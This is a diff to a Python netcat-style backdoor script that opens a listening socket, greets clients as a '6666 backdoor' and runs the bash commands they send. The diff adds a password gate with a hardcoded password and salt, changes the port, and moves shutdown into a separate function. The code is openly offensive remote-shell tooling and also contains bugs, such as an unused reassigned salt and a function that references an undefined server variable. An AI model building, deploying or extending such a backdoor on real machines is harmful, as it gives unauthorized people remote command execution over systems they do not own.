@@ -17,6 +17,7 @@ import getopt
 import sys
 import subprocess
 import string
+import hashlib, uuid
 
 LISTEN = True
 HOST = ''
@@ -32,7 +33,7 @@ def start():
 
     # run in netcat listen mode (server).
     HOST = '127.0.0.1'
-    PORT = 6666
+    PORT = 6667
     PWD = subprocess.check_output(['pwd'])
     PWD = PWD.rstrip()
     server_connector()
@@ -50,6 +51,7 @@ def server_connector():
         clientSocket, addr = server.accept()
         print("NC Client has connected via" + addr[0] + ":" + str(addr[1]))
         clientSocket.send(bytearray("Welcome to 6666 backdoor: \n","utf-8"))
+        passwordChecker(clientSocket)
         server_listener(clientSocket,server)
 
 
@@ -79,8 +81,6 @@ def server_listener(clientSocket,server):
                     temp = PWD.decode()[:last]
                     PWD = temp.encode()
                     output = PWD
-            elif(subprocess.check_output(['cd', bash_args[1]]).rstrip().endsWith("No such file or directory"))
-                output = PWD
             else:
                 print(bash_args[1])
                 PWD = (PWD.decode().rstrip() + '/' + bash_args[1]).encode()
@@ -107,13 +107,39 @@ def server_listener(clientSocket,server):
                 output = output.encode()
 
         elif bashCommand == 'off':
-            server.shutdown(1)
-            server.close()
-            sys.exit()
+            off_function()
         else:
             output = "Not a valid bash command \n".encode()
 
         clientSocket.send(output)
+
+def passwordChecker(clientSocket):
+    
+    password = "allyourbasebelongtous"
+    pw_bytes = password.encode('utf-8')
+    salt = "!#9aB0~41f"
+    salt_bytes = salt.encode('utf-8')
+    salt = uuid.uuid4().hex
+    hashed_password = hashlib.sha512(pw_bytes + salt_bytes).hexdigest()
+    while True:
+        clientSocket.send(bytearray("Please enter your password: \n","utf-8"))
+        buffer = ''
+        while "\n" not in buffer:
+            buffer = clientSocket.recv(1024).decode()
+        buffer = buffer.rstrip()
+        buffer_bytes = buffer.encode('utf-8')
+        user_hashed_password = hashlib.sha512(buffer_bytes + salt_bytes).hexdigest()
+        if hashed_password == user_hashed_password:
+            clientSocket.send(bytearray("Password Correct \n","utf-8"))
+            return
+        else:
+            clientSocket.send(bytearray("Error, wrong password \n","utf-8"))
+
+def off_function():
+    
+    server.shutdown(1)
+    server.close()
+    sys.exit()
 
 
 if __name__ == '__main__':
